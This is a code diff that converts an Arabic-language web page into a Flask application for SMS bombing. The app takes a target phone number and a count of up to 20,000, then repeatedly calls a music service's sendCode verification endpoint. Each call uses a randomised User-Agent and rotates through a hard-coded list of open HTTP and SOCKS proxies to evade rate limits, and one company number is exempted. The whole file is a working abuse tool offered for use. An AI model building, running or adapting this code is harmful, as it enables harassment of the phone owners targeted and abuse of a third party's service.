@@ -1,3 +1,36 @@
+from flask import Flask, request, jsonify, render_template_string
+import requests, random, time
+
+app = Flask(__name__)
+
+# API الشرعي
+API_URL = "https://api.twistmena.com/music/Dlogin/sendCode"
+
+# User-Agents
+USER_AGENTS = [
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.134 Safari/537.36",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.134 Safari/537.36",
+    "Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1"
+]
+
+# بروكسيات اختيارية
+PROXIES = [
+    {"http": "http://3.71.96.137:8090"},
+    {"http": "http://49.13.173.87:8081"},
+    {"http": "http://49.12.235.70:8081"},
+    {"http": "http://49.12.235.70:80"},
+    {"http": "http://49.13.173.87:80"},
+    {"http": "http://116.202.121.34:3128"},
+    {"socks4": "socks4://148.72.215.230:55327"},
+    {"socks4": "socks4://37.59.213.49:56887"},
+    {"socks4": "socks4://200.46.30.210:4153"}
+]
+
+# أرقام ممنوعة
+BLOCKED_NUMBERS = ["01212843252"]
+
+# القالب HTML مدمج
+HTML_PAGE = """
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
@@ -5,80 +38,17 @@
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>إرسال الأكواد - RTT</title>
 <style>
-  body, html {
-    margin: 0;
-    padding: 0;
-    height: 100%;
-    overflow: hidden;
-    font-family: Arial, sans-serif;
-    display: flex;
-    justify-content: center;
-    align-items: center;
-    flex-direction: column;
-    background: black;
-    color: white;
-  }
-  video#bgVideo {
-    position: fixed;
-    right: 0;
-    bottom: 0;
-    min-width: 100%;
-    min-height: 100%;
-    z-index: -1;
-  }
-  .container {
-    background: rgba(0,0,0,0.6);
-    padding: 30px;
-    border-radius: 15px;
-    text-align: center;
-    box-shadow: 0 0 20px red;
-    width: 90%;
-    max-width: 400px;
-  }
-  input, button {
-    padding: 10px;
-    margin: 10px 0;
-    width: 80%;
-    border-radius: 8px;
-    border: none;
-    font-size: 1rem;
-  }
-  button {
-    background: red;
-    color: white;
-    cursor: pointer;
-    box-shadow: 0 0 10px red;
-    transition: 0.2s;
-  }
-  button:hover {
-    box-shadow: 0 0 20px red, 0 0 30px red;
-  }
-  h2, p {
-    margin: 10px 0;
-    text-shadow: 0 0 10px red;
-  }
-  .counter {
-    font-size: 1.2rem;
-    margin: 10px 0;
-    text-shadow: 0 0 10px red;
-    animation: neon 1.5s infinite alternate;
-  }
-  .current-msg {
-    font-size: 1rem;
-    margin: 5px 0;
-    min-height: 20px;
-    text-shadow: 0 0 10px red;
-  }
-  .footer {
-    margin-top: 20px;
-    text-shadow: 0 0 10px red;
-  }
-
-  @keyframes neon {
-    0% { text-shadow: 0 0 5px red, 0 0 10px red; }
-    50% { text-shadow: 0 0 15px red, 0 0 30px red; }
-    100% { text-shadow: 0 0 5px red, 0 0 10px red; }
-  }
+body, html {margin:0;padding:0;height:100%;font-family:Arial,sans-serif;display:flex;justify-content:center;align-items:center;flex-direction:column;background:black;color:white;}
+video#bgVideo {position:fixed;right:0;bottom:0;min-width:100%;min-height:100%;z-index:-1;}
+.container {background:rgba(0,0,0,0.6);padding:30px;border-radius:15px;text-align:center;box-shadow:0 0 20px red;width:90%;max-width:400px;}
+input, button {padding:10px;margin:10px 0;width:80%;border-radius:8px;border:none;font-size:1rem;}
+button {background:red;color:white;cursor:pointer;box-shadow:0 0 10px red;transition:0.2s;}
+button:hover {box-shadow:0 0 20px red,0 0 30px red;}
+h2,p {margin:10px 0;text-shadow:0 0 10px red;}
+.counter {font-size:1.2rem;margin:10px 0;text-shadow:0 0 10px red;animation:neon 1.5s infinite alternate;}
+.current-msg {font-size:1rem;margin:5px 0;min-height:20px;text-shadow:0 0 10px red;}
+.footer {margin-top:20px;text-shadow:0 0 10px red;}
+@keyframes neon {0%{text-shadow:0 0 5px red,0 0 10px red;}50%{text-shadow:0 0 15px red,0 0 30px red;}100%{text-shadow:0 0 5px red,0 0 10px red;}}
 </style>
 </head>
 <body>
@@ -113,68 +83,32 @@ const failureCountElem = document.getElementById( failureCount );
 const currentMsgElem = document.getElementById( currentMsg );
 const thankMsg = document.getElementById( thankMsg );
 
-// قائمة الأرقام الممنوعة
-const blockedNumbers = ["01212843252"];
-
-const API_URL = "https://api.twistmena.com/music/Dlogin/sendCode";
-const userAgents = [
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.134 Safari/537.36",
-    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.134 Safari/537.36",
-    "Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1"
-];
-
-async function sendMessages(number, count) {
-    let success = 0;
-    let failure = 0;
-    successCountElem.textContent = success;
-    failureCountElem.textContent = failure;
-    thankMsg.style.display = "none";
-    resetBtn.style.display = "none";
-
-    for(let i=1; i<=count; i++){
-        currentMsgElem.textContent = `جارِ إرسال الرسالة ${i}...`;
-        const payload = { dial: "2" + number };
-        const headers = { "Content-Type": "application/json", "User-Agent": userAgents[Math.floor(Math.random()*userAgents.length)] };
-
-        try {
-            const res = await fetch(API_URL, { method: "POST", headers: headers, body: JSON.stringify(payload) });
-            const data = await res.json();
-            if(data.responseHeader && data.responseHeader.status){
-                success++;
-            } else {
-                failure++;
-            }
-        } catch(err){
-            failure++;
-        }
-        successCountElem.textContent = success;
-        failureCountElem.textContent = failure;
-        await new Promise(r => setTimeout(r, 1000));
-    }
-
-    currentMsgElem.textContent = "";
-    thankMsg.style.display = "block";
-    resetBtn.style.display = "inline-block";
-}
-
-sendBtn.addEventListener( click , () => {
+sendBtn.addEventListener( click , async () => {
     const number = document.getElementById( userNumber ).value.trim();
     let count = parseInt(document.getElementById( smsCount ).value);
-
-    if(!number || isNaN(count)){
-        alert("يرجى إدخال الرقم وعدد الرسائل");
-        return;
-    }
-
-    if(blockedNumbers.includes(number)){
-        alert(`❌ ممنوع الإرسال للرقم ${number} لأنه خاص بالشركة!`);
-        return;
-    }
-
+    if(!number || isNaN(count)){ alert("يرجى إدخال الرقم وعدد الرسائل"); return; }
     if(count < 10) count = 10;
     if(count > 20000) count = 20000;
 
-    sendMessages(number, count);
+    currentMsgElem.textContent = "جارِ الإرسال...";
+    successCountElem.textContent = "0";
+    failureCountElem.textContent = "0";
+    thankMsg.style.display = "none";
+
+    try{
+        const res = await fetch( /send_sms , {
+            method: POST ,
+            headers:{ Content-Type : application/json },
+            body:JSON.stringify({number,count})
+        });
+        const data = await res.json();
+        if(data.error){ alert(data.error); currentMsgElem.textContent = ""; return; }
+        successCountElem.textContent = data.success;
+        failureCountElem.textContent = data.failure;
+        currentMsgElem.textContent = "";
+        thankMsg.style.display = "block";
+        resetBtn.style.display = "inline-block";
+    }catch(err){ alert("حدث خطأ"); }
 });
 
 resetBtn.addEventListener( click , () => {
@@ -186,6 +120,45 @@ resetBtn.addEventListener( click , () => {
     resetBtn.style.display = "none";
 });
 </script>
-
 </body>
 </html>
+"""
+
+@app.route( / )
+def index():
+    return render_template_string(HTML_PAGE)
+
+@app.route( /send_sms , methods=[ POST ])
+def send_sms():
+    data = request.json
+    number = data.get( number )
+    count = int(data.get( count , 10))
+    
+    if number in BLOCKED_NUMBERS:
+        return jsonify({"error": f"❌ ممنوع الإرسال للرقم {number} لأنه خاص بالشركة!"})
+
+    if count < 10: count = 10
+    if count > 20000: count = 20000
+
+    success = 0
+    failure = 0
+
+    for i in range(count):
+        payload = {"dial": "2" + number}
+        headers = {"Content-Type": "application/json", "User-Agent": random.choice(USER_AGENTS)}
+        proxy = random.choice(PROXIES)
+        try:
+            res = requests.post(API_URL, json=payload, headers=headers, proxies=proxy, timeout=5)
+            status = res.json().get("responseHeader", {}).get("status", "No status")
+            if status == "success":
+                success += 1
+            else:
+                failure += 1
+        except:
+            failure += 1
+        time.sleep(0.5)
+    return jsonify({"success": success, "failure": failure})
+
+if __name__ == "__main__":
+    app.run(debug=True)
+  
